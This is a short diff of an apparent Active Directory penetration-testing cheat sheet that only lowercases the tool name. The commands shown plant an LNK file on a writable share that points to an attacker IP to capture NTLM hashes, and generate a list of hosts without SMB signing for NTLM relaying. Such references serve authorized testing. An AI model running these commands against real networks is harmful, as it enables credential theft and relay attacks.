@@ -623,12 +623,12 @@ pre2k auth -d <AD_domain> -dc-ip <Domain_Controller_IP>
   
   ### Creates a lnk file for a share with read/write rights
   ```shell
-  NetExec smb <Target_IP> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP>
+  netexec smb <Target_IP> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP>
   ```
    
   ### Remove the lnk file
   ```shell
-  NetExec smb <Target_IP> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP> CLEANUP=True
+  netexec smb <Target_IP> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP> CLEANUP=True
   ```
     
 </details>
@@ -637,7 +637,7 @@ pre2k auth -d <AD_domain> -dc-ip <Domain_Controller_IP>
 
   ### Evaluate no smb-signing and create an IP txt file for NTLMRelayx
   ```shell
-  NetExec smb <IPs> --gen-relay-list <nosmbsigning.txt>
+  netexec smb <IPs> --gen-relay-list <nosmbsigning.txt>
   ```
 
   ### NTLMRelayx
